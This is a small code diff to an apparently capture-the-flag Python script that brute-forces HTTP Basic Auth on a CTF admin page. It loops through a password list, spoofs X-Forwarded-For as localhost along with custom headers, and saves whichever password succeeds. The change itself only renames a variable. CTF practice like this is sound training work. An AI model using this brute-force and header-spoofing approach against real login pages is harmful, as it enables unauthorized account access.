@@ -11,17 +11,17 @@ pbar = tqdm(total=len(lines))
 
 def request():
     for idx, pw in enumerate(lines):
-        pw=pw.strip()
+        _pw=pw.strip()
         #print(pw)
         r = requests.get('http://ctf.adl.tw:12002/admin',
                          headers={"X-Forwarded-For": "127.0.0.1",
                                   "User-Agent": "STARRYBrowser",
-                                  "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
+                                  "Accept-Language": "ja-JP"}, auth=("bocchi", _pw))
         if r.status_code!=401:
-            print('found it:',pw)
+            print('found it:',_pw)
             
             with open('./debug/pw.txt', 'w') as f:
-                f.write(pw)
+                f.write(_pw)
             
             print('\n',r.text)
             break
